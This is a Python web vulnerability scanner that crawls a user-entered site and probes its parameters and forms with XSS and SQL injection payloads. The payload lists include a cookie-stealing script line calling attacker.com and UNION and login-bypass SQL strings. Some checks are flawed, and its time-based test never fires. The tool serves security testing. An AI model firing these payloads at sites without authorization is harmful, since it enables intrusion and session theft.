import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import re
from typing import Set, List, Dict
import logging
from dataclasses import dataclass
from datetime import datetime
import pyfiglet
from colorama import Fore, Style, init

init(autoreset=True)

@dataclass
class VulnerabilityReport:
    url: str
    vulnerability_type: str
    description: str
    severity: str
    evidence: str
    timestamp: str = datetime.now().isoformat()

class WebScanner:
    def __init__(self, base_url: str, max_pages: int = 10):
        self.base_url = base_url
        self.max_pages = max_pages
        self.visited_urls: Set[str] = set()
        self.vulnerabilities: List[VulnerabilityReport] = []
        
        # Configure logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)

        # Common patterns for detection
        self.error_patterns = {
            'sql': [
                'sql syntax',
                'mysql_fetch',
                'Microsoft OLE DB Provider for SQL Server',
                'mysql_num_rows()',
                'mysql_result',
                'Warning: mysql_',
                'ORA-00933',
                'ORA-01756',
                'Microsoft OLE DB Provider for SQL Server',
                'PostgreSQL query failed',
                'supplied argument is not a valid MySQL',
                'Column count doesn\'t match',
                'mysql_fetch_array()',
                'on MySQL result index',
                'You have an error in your SQL syntax',
                'Error Executing Database Query',
                'Unclosed quotation mark',
                'SQL Server driver'
            ],
            'xss_reflected': [
                '<script>',
                'onerror=',
                'onload=',
                'onmouseover=',
                'onclick=',
                'onmouseout=',
                'alert(',
                'prompt(',
                'confirm('
            ]
        }

    def is_same_domain(self, url: str) -> bool:
        return urlparse(url).netloc == urlparse(self.base_url).netloc

    def extract_links(self, html: str, current_url: str) -> Set[str]:
        soup = BeautifulSoup(html, 'html.parser')
        links = set()
        
        # Extract links from anchors
        for anchor in soup.find_all('a', href=True):
            href = anchor.get('href')
            if href:
                full_url = urljoin(current_url, href)
                if self.is_same_domain(full_url):
                    links.add(full_url)
        
        # Extract links from forms
        for form in soup.find_all('form', action=True):
            action = form.get('action')
            if action:
                full_url = urljoin(current_url, action)
                if self.is_same_domain(full_url):
                    links.add(full_url)
        
        return links

    def test_xss_vulnerability(self, url: str, html: str) -> None:
        """Enhanced XSS vulnerability testing"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "\"><img src=x onerror=alert(1)>",
            "' onmouseover='alert(1)",
            "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
            "<img src=1 onerror=alert(document.cookie)>",
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "<script>prompt(1)</script>",
            "<script>confirm(1)</script>"
        ]

        # Test for reflected XSS in URL parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for param_name, param_values in params.items():
                for payload in xss_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"
                    
                    try:
                        response = requests.get(test_url, timeout=10)
                        if payload in response.text:
                            self.record_vulnerability(
                                url=url,
                                vuln_type="Reflected XSS",
                                severity="High",
                                evidence=f"Parameter '{param_name}' reflected payload: {payload}"
                            )
                    except requests.RequestException as e:
                        self.logger.error(f"Error testing XSS: {str(e)}")

        # Test for stored XSS
        soup = BeautifulSoup(html, 'html.parser')
        for script in soup.find_all(['script', 'img', 'iframe', 'a']):
            for attr in script.attrs:
                attr_value = script[attr]
                if any(pattern in str(attr_value).lower() for pattern in self.error_patterns['xss_reflected']):
                    self.record_vulnerability(
                        url=url,
                        vuln_type="Potential Stored XSS",
                        severity="Critical",
                        evidence=f"Suspicious content found: {attr}={attr_value}"
                    )

    def test_sql_injection(self, url: str) -> None:
        """Enhanced SQL injection testing"""
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "') OR ('1'='1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "admin' --",
            "admin' #",
            "' OR 1=1",
            "' OR 'x'='x",
            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' UNION SELECT null--",
            "1' UNION SELECT null,null--",
            "1' UNION SELECT null,null,null--"
        ]

        parsed_url = urlparse(url)
        if parsed_url.query:
            params = parse_qs(parsed_url.query)
            for param_name, param_values in params.items():
                for payload in sql_payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params, doseq=True)}"
                    
                    try:
                        response = requests.get(test_url, timeout=10)
                        
                        # Check for SQL error messages
                        if any(error in response.text.lower() for error in self.error_patterns['sql']):
                            self.record_vulnerability(
                                url=url,
                                vuln_type="SQL Injection",
                                severity="Critical",
                                evidence=f"Parameter '{param_name}' vulnerable to payload: {payload}"
                            )
                            break
                            
                        # Check for time-based injection
                        if "SLEEP" in payload:
                            start_time = datetime.now()
                            requests.get(test_url, timeout=15)
                            execution_time = (datetime.now() - start_time).total_seconds()
                            if execution_time > 5:
                                self.record_vulnerability(
                                    url=url,
                                    vuln_type="Time-based SQL Injection",
                                    severity="Critical",
                                    evidence=f"Parameter '{param_name}' vulnerable to time-based injection"
                                )
                                
                    except requests.RequestException as e:
                        if "timeout" in str(e).lower():
                            self.record_vulnerability(
                                url=url,
                                vuln_type="Potential Time-based SQL Injection",
                                severity="High",
                                evidence=f"Request timeout with payload: {payload}"
                            )
                        else:
                            self.logger.error(f"Error testing SQL injection: {str(e)}")

    def scan_forms(self, url: str, html: str) -> None:
        """Scan HTML forms for potential vulnerabilities"""
        soup = BeautifulSoup(html, 'html.parser')
        for form in soup.find_all('form'):
            action = urljoin(url, form.get('action', ''))
            method = form.get('method', 'get').lower()
            
            # Test each input field
            for input_field in form.find_all(['input', 'textarea']):
                field_name = input_field.get('name')
                if not field_name:
                    continue
                    
                # Test for XSS in form fields
                if method == 'get':
                    xss_payload = "<script>alert('XSS')</script>"
                    test_url = f"{action}?{field_name}={xss_payload}"
                    try:
                        response = requests.get(test_url, timeout=10)
                        if xss_payload in response.text:
                            self.record_vulnerability(
                                url=url,
                                vuln_type="Form-based XSS",
                                severity="High",
                                evidence=f"Form field '{field_name}' vulnerable to XSS"
                            )
                    except requests.RequestException:
                        pass

    def record_vulnerability(self, url: str, vuln_type: str, severity: str, evidence: str) -> None:
        """Record a detected vulnerability."""
        self.vulnerabilities.append(VulnerabilityReport(
            url=url,
            vulnerability_type=vuln_type,
            description=f"{vuln_type} vulnerability detected.",
            severity=severity,
            evidence=evidence
        ))
        print(Fore.RED + f"[{vuln_type} Detected] {url}")
        print(Fore.YELLOW + f"Evidence: {evidence}")

    def scan_page(self, url: str) -> Set[str]:
        if url in self.visited_urls or len(self.visited_urls) >= self.max_pages:
            return set()

        print(Fore.GREEN + f"[Scanning] {url}")
        self.visited_urls.add(url)

        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            html = response.text
            
            # Run all vulnerability tests
            self.test_xss_vulnerability(url, html)
            self.test_sql_injection(url)
            self.scan_forms(url, html)
            
            return self.extract_links(html, url)
            
        except requests.RequestException as e:
            self.logger.error(f"Error scanning {url}: {str(e)}")
            return set()

    def scan(self) -> List[VulnerabilityReport]:
        urls_to_scan = {self.base_url}
        while urls_to_scan and len(self.visited_urls) < self.max_pages:
            url = urls_to_scan.pop()
            new_urls = self.scan_page(url)
            urls_to_scan.update(new_urls - self.visited_urls)
        return self.vulnerabilities

    def generate_report(self) -> str:
        """Generate a formatted report of found vulnerabilities."""
        report = [
            f"\n{Fore.CYAN}{pyfiglet.figlet_format('Scan Report')}",
            f"{Fore.YELLOW}Target: {self.base_url}",
            f"Scan Date: {datetime.now().isoformat()}",
            f"Pages Scanned: {len(self.visited_urls)}",
            f"\n{Fore.RED}Vulnerabilities Found:"
        ]

        if not self.vulnerabilities:
            report.append(f"{Fore.GREEN}No vulnerabilities detected.")
        else:
            for vuln in self.vulnerabilities:
                report.extend([
                    f"\n{Fore.YELLOW}Type: {vuln.vulnerability_type}",
                    f"URL: {vuln.url}",
                    f"{Fore.RED}Severity: {vuln.severity}",
                    f"Description: {vuln.description}",
                    f"{Fore.MAGENTA}Evidence: {vuln.evidence}",
                    "---"
                ])

        return "\n".join(report)

def main():
    logo = pyfiglet.figlet_format("Web Vuln Scanner")
    print(Fore.CYAN + logo)
    print(Fore.GREEN + "- Created by Premkumar Soni")
    print(Fore.YELLOW + "Welcome to the Web Application Vulnerability Scanner!\n")
    
    target_url = input(Fore.BLUE + "Enter the target website URL (e.g., http://example.com): ").strip()
    if not target_url or not re.match(r'https?://', target_url):
        print(Fore.RED + "Error: Invalid or missing URL. Ensure the URL starts with http:// or https://.")
        return

    scanner = WebScanner(target_url)
    scanner.scan()
    print(scanner.generate_report())

if __name__ == "__main__":
    main()
